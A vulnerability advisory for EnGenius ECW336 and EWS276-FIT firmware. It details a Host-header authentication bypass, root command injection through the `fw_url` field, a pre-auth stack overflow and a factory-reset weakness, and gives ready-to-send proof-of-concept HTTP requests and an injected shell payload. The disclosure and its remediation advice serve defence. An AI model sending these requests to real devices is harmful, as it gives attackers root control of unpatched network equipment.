# EnGenius ECW336 1.6.71 was discovered to contain a Host-header authentication bypass and command injection vulnerability

## Overview

- Vendor: EnGenius
- Product: ECW336 1.6.71, EWS276-FIT 1.0.45
- Version: 1.6.71 / 1.0.45
- Component: www/cgi-bin/api.fcgi FastCGI handler
- Vulnerability Class: CWE-290 authentication bypass by spoofing / CWE-78 command injection
- CVSS 3.1 (tentative): 9.8 Critical `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Manufacturer: https://www.engeniustech.com/

## Affected versions

- `ecw336-1.6.71-1.zip`.
- `ecw336-1.6.71-1.bin`.
- Decrypted image (EnGenius XOR header transform).
- `www/cgi-bin/api.fcgi`.
- `lib/libsnjsonap.so` and `sbin/getLatestFWInfo.sh`.

### EWS276-FIT 1.0.45

- `ews276-fit-1.0.45-2.bin`.
- `www/cgi-bin/api.fcgi`.
- `lib/libsnjsonap.so`.
- `usr/sbin/senao-openapi-server`.
- `sbin/getLatestFWInfo.sh`.

EWS377AP v3 3.9.3.2 carries the same `fw_url` format string in its JSON
library, but its `api.fcgi` `main` does not contain the
`SERVER_NAME == 127.0.0.1` bypass and it is not claimed as affected.

## Authentication bypass

`api.fcgi` `main` reads the FastCGI `SERVER_NAME` parameter and skips
the JWT check when it equals `127.0.0.1`:

```c
v31 = FCGX_GetParam("SERVER_NAME", envp);
sub_15C24(v31, v58, 64);
...
if ( !strcmp((const char *)&v59[2], "login")
  || !strcmp((const char *)&v59[2], "open_info")
  || !strcmp((const char *)&v59[4], "client_info")
  || !strcmp((const char *)&v59[2], "reset_with_key")
  || !strcmp(v58, "127.0.0.1") )
{
    /* dispatch table, no JWT check */
}
else
{
    v20 = FCGX_GetParam("JWT_TOKEN", envp);
    ...
    genErrorMessage(..., 8, "EMPTY JWT TOKEN");
}
```

`SERVER_NAME` comes from lighttpd and, in the shipped lighttpd 1.4.54,
is taken directly from the HTTP `Host` header. A CGI environment test
with the firmware's own lighttpd binary shows:

```text
Host: 127.0.0.1      -> SERVER_NAME=127.0.0.1
Host: 192.0.2.55     -> SERVER_NAME=192.0.2.55
Host: evil.example   -> SERVER_NAME=evil.example
```

Thus an unauthenticated request with `Host: 127.0.0.1` enters the
no-token branch. The default role `dword_2F1DC` is `1`; the dispatch
entry for `POST /api/mgm/ocu/fw_check` has mask `0x3`, so role 1 is
allowed to invoke it.

## Command injection

The dispatch table maps `['mgm','ocu','fw_check'] POST mask 0x3` to the
handler that calls `json_post_mgm_fw_check`. That function reads the
attacker-controlled `fw_url` string and runs:

```c
j_senao_json_object_get_and_create_string(a1, v5, "fw_url", &v7);
...
if ( sys_check_file_existed("/sbin/getLatestFWInfo.sh") )
{
    sprintf(s, "sh /sbin/getLatestFWInfo.sh %s &", v7);
    system(s);
}
```

`fw_url` is not quoted or validated. A value such as
`;id>/tmp/en_pwn;#` produces:

```sh
sh /sbin/getLatestFWInfo.sh ;id>/tmp/en_pwn;# &
```

and the second command runs in the `api.fcgi` process context. The
shipped lighttpd configuration leaves `server.username` commented out
and the service is started by init as root, so this is root command
execution on the device.

### Stack overflow in the same field

The same `sprintf` is also unbounded on the destination side:

```c
char s[256];     // sp+0x10
sprintf(s, "sh /sbin/getLatestFWInfo.sh %s &", fw_url);
```

`json_post_mgm_fw_check` allocates a 1312-byte frame; `s` is at
`sp+0x10` and the saved `lr` at `sp+0x51c`, so roughly 1292 bytes of
`fw_url` reach the saved return address. The library has no
`__stack_chk_guard` import. A 2000-byte or 4000-byte `fw_url` sent
through the Host-bypass request made the FastCGI child die with
`child signalled: 11` (SIGSEGV). This is a pre-auth stack overflow with
fully controlled bytes; no ROP chain was developed. EWS276-FIT's
`libsnjsonap.so` contains the same `sprintf` format string; the crash
test was performed on ECW336.

## PoC

The stock `api.fcgi`, `libsnjsonap.so`, `getLatestFWInfo.sh` and the
native `senao-openapi-server` (lighttpd 1.4.69) were run inside the
extracted ECW336 rootfs under qemu-arm.
The test client connected from a non-loopback address
(`192.168.0.110`) so `REMOTE_ADDR` was not `127.0.0.1`.

Authentication bypass check, no JWT:

```http
GET /api/net/ethernet HTTP/1.1
Host: 127.0.0.1
```

returned `200 OK` with the device network configuration, while the same
request with `Host: 192.168.0.110` returned:

```json
{"status_code":401,"reason_phrase":"Unauthorized","error_code":8,
 "error_message":"INVALID TOKEN:EMPTY JWT TOKEN","data":null}
```

Command injection:

```http
POST /api/mgm/ocu/fw_check HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{"fw_url":";id>/tmp/en_pwn;#"}
```

returned `200 OK` and wrote the output of `id` to `/tmp/en_pwn`; the
same request with `Host: 192.168.0.110` returned the 401 JWT error and
did not create the marker. In the emulation the marker shows the host
user because qemu ran as a normal user; on the device the same code runs
as root.

The same end-to-end test was repeated with the EWS276-FIT 1.0.45
rootfs, stock `api.fcgi`/`libsnjsonap.so` and its native
`senao-openapi-server` (lighttpd 1.4.69). `GET /api/net/ethernet` with
`Host: 127.0.0.1` and no JWT returned `200 OK`, while the normal Host
returned `401 INVALID TOKEN`; `POST /api/mgm/ocu/fw_check` with
`{"fw_url":";id>/tmp/ews276_pwn;#"}` returned `200 OK` and created the
`id` marker, while the normal Host returned 401 and created nothing.

Other pre-auth effects of the same bypass include unauthenticated
access to mask-3 `GET` APIs (e.g. `/api/net/ethernet`,
`/api/mgm/tools/nslookup`). The mask-3 `POST /api/mgm/ocu/fw_download`
action has a second `fw_url` sink:
`sh /sbin/doDownloadFW.sh %d %s &` + `system()`. It requires
`/tmp/newfwmd5sum` to exist, which `fw_check` creates when the attacker
hosts a valid response at the supplied URL, so the two requests chain
into another pre-auth command execution / firmware-download path.

The mask-3 `POST /api/mgm/reset_with_key` action performs a factory
reset pre-auth. Its only check is
`md5(uppercase(MAC of br-lan))` (32 hex characters), and the LAN MAC is
printed on the device and visible in ARP, so it is not a secret.

## Verification

The vulnerable handler in the stock `www/cgi-bin/api.fcgi FastCGI handler` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

An unauthenticated attacker on the management LAN can bypass the JWT
check with a single `Host: 127.0.0.1` header and execute arbitrary
commands as root through the firmware-check endpoint. The same bypass
exposes read-only management APIs and the MAC-derived factory-reset
action without credentials.

## Remediation / known-CVE relation

- Do not use `SERVER_NAME` (a client-controlled `Host` value) as an
  authentication or loopback trust signal. Check the real peer address
  (`REMOTE_ADDR`) or a server-side secret instead.
- Require a valid JWT for every management action, including
  `mgm/ocu/*`; do not grant role 1 to unauthenticated requests.
- Quote or reject `fw_url` and pass it as a separate argv element to
  `getLatestFWInfo.sh`; never build a shell string.
- NVD keyword searches on 2026-11-08 for `getLatestFWInfo`,
  `post_mgm_fw_check`, `EnGenius fw_url`, `SERVER_NAME 127.0.0.1
  EnGenius` and `ECW336 command injection` returned zero results.
  Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
EnGenius

### Product
ECW336 1.6.71, EWS276-FIT 1.0.45

### Version or Commit
1.6.71 / 1.0.45

### Vulnerability Class
CWE-290 authentication bypass by spoofing / CWE-78 command injection

### CVE_status
CVE application in progress

### Description
api.fcgi trusts the Host header when deciding whether a request is local, allowing a remote unauthenticated caller to reach privileged handlers. The fw_url parameter is then interpolated into a shell command, giving command execution.

### Affected_component
www/cgi-bin/api.fcgi FastCGI handler

### Attack_vector
Remote request with a spoofed Host header and a crafted fw_url parameter.

### Product_version
ECW336 1.6.71, EWS276-FIT 1.0.45 1.6.71 / 1.0.45

### Reference
- https://www.engeniustech.com/
- https://github.com/vuln-1/vuln/blob/main/EnGenius/ECW336_V1.6.71/report-2.md
```
